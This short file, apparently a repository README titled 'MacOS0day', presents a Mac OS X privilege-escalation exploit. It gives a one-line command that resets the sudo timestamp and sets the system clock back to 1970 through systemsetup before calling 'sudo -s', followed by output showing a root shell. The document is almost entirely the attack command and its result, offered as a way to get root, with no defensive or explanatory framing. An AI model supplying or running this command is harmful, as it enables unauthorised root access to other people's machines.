MacOS0day
=========

Mac OS X - Get Root Priv 


thongngo$ sudo -k; systemsetup -setusingnetworktime Off -settimezone GMT -set date 01:01:1970 -settime 00:01; sudo -s

bash-3.x$ whoami
root
